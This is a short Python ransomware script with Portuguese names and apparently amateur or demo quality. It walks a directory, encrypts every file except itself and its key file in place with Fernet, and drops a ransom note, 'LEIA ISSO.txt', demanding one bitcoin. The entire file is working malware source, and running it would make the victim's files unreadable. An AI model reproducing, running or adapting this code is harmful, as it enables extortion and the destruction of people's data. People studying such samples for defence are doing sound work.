from cryptography.fernet import Fernet
import os

DIRETORIO=""

def gerar_chave():
	chave = Fernet.generate_key() 
	with open("chave.key",'wb') as arquivo_chave:
		arquivo_chave.write(chave)

def carregar_chave():
	return open("chave.key","rb").read()

def criptografar_arquivo(arquivo,chave):
	encriptador = Fernet(chave)
	with open(arquivo,'rb') as file:
		dados = file.read()
	dados_criptografados = encriptador.encrypt(dados)
	with open(arquivo, "wb") as file:
		file.write(dados_criptografados)

def encontrar_arquivos(diretorio):
	lista = []
	for raiz, _, arquivos in os.walk(diretorio):
		for nome in arquivos:
			caminho = os.path.join(raiz,nome)
			if nome != "ransomware.py" and not nome.endswith(".key"):
				lista.append(caminho)
	return lista

def criar_mensagem_de_resgate():
	with open("LEIA ISSO.txt","w",encoding="utf8") as mensagem:
		mensagem.write("Seus arquivos foram criptografados!\n")
		mensagem.write("Envie 1 bitcoin para o endereço X e envie o comprovante.\n")
		mensagem.write("Após isso, enviaremos a chave para você recuperar seu dados")

def main():
	gerar_chave()
	chave = carregar_chave()
	arquivos=encontrar_arquivos(DIRETORIO)
	for arquivo in arquivos:
		criptografar_arquivo(arquivo,chave)
	criar_mensagem_de_resgate()
	print("Ransomware executado.")

if __name__ =="__main__":
	main()
